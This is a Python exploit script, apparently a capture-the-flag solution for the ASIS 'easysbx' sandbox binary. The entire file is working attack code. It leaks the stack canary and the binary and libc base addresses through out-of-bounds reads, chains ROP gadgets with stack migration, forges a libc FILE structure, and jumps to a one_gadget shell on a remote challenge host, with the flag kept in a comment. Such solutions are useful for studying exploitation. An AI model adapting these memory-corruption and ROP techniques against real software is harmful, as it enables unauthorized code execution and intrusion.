#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './easysbx'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':True, 'gdbscript':'set follow-fork-mode parent'}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'65.108.188.88', 'port':41010})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.31.so')
env.set_item('offset_one_gadget', debug = 0xe6aee, local = 0xe6aee, remote = 0xe6c7e)
env.select()

#==========

binf = ELF(bin_file)
offset_main         = 0x1814

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_main        = libc.sep_function['__libc_start_main']
offset_libc_mp          = 0x1eb280
    
fd_out = 4
fd_in  = 5

#==========

def attack(conn, **kwargs):
    bs = BabySBX(conn)

    bs.write(0x100, 'a'*0x100)
    addr_stack = u(bs.read()[0x100:]) - 0x120
    info('addr_stack        = 0x{:08x}'.format(addr_stack))

    bs.write(-1, 'b'*0x109)
    canary = u(b'\x00'+bs.read()[0x109:0x109+7])
    info('canary            = 0x{:08x}'.format(canary))

    bs.write(-1, 'c'*0x118)
    addr_main = u(bs.read()[0x118:]) - 0xe3
    binf.address = addr_main - offset_main
    info('addr_binf_base    = 0x{:08x}'.format(binf.address))
    addr_bss  = binf.sep_section['.bss']
    addr_buf  = addr_bss + 0x80

    bs.write(-1, 'd'*0x128)
    addr_libc_main = u(bs.read()[0x128:]) - 0xf3
    libc.address = addr_libc_main - offset_libc_main
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_mp = libc.address + offset_libc_mp
    addr_libc_io_file_jumps = libc.symbols['_IO_file_jumps']
    addr_one_gadget         = libc.address + env.offset_one_gadget

    rop = ROP(libc)
    rop.write(constants.STDOUT_FILENO, addr_libc_mp+0x48, 8)
    rop.read(constants.STDIN_FILENO, addr_buf, 0x300)
    rop.read(constants.STDIN_FILENO, addr_stack+0x200, 0x200)
    rop.migrate(addr_stack+0x200)

    exploit  = b'x'*0x108
    exploit += flat(canary, 0xdeadbeef)
    exploit += bytes(rop)
    bs.write(-1, exploit)
    bs.exit()

    addr_heap_base = u(conn.read(8))
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))
    addr_fp = addr_heap_base + 0x2a0

    msg = []
    msg += [p32(0) + b'lol'.ljust(0x8, b'\x00')]
    msg += [p32(2) + b'\x11'*8]
    msg += [p32(5) + b'\x22'*4 + p32(0x1d8)]
    msg += [p32(3) + b'\x33'*4 + p32(0x1d7)]
    msg += [p32(2) + b'\x11'*8]

    fp  = p64(0xfbad3c80)
    fp += b'\x00'*0x18
    fp += flat(addr_libc_io_file_jumps-0x8+0x88, (addr_libc_io_file_jumps-0x8+0x88)+0x8)
    fp += b'\x00'*0x38
    fp += flat(0xdeadbeef, constants.STDIN_FILENO, 0, 0, addr_fp + 0xe0, -1, 0, addr_fp + 0xf0)
    fp += b'\x00'*0x30
    fp += p64(addr_libc_io_file_jumps-0x8)
    fp += b'\x00'*0xf0
    fp += p64(0xbabe0000)
    conn.send(b''.join(msg)+fp)

    rop = ROP(libc)
    rop.write(fd_out, addr_buf+0xc*0, 0xc)
    rop.write(fd_out, addr_buf+0xc*1, 0xc)
    rop.write(fd_out, addr_buf+0xc*2, 0xc)
    rop.write(fd_out, addr_buf+0xc*3, 0xc)
    rop.write(fd_out, addr_buf+0xc*5, 0x1d7)
    rop.write(fd_out, addr_buf+0xc*4, 0xc)

    rop.exit(0)

    conn.send(bytes(rop))
    sleep(0.5)
    conn.send(p64(addr_one_gadget))

class BabySBX:
    def __init__(self, conn):
        self.recv           = conn.recv
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter

    def write(self, length, data):
        self.sendlineafter('Choice: ', '1')
        self.sendlineafter('Length: ', str(length))
        self.send(data)

    def read(self):
        self.sendlineafter('Choice: ', '2')
        s = self.recvuntil('Choice')[:-6]
        self.unrecv('Choice')
        return s

    def exit(self):
        self.sendlineafter('Choice: ', '3')


#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # ASIS{9358C3E1AF3077977DACBBEDEB93269D}

if __name__=='__main__':
    main()

#==========
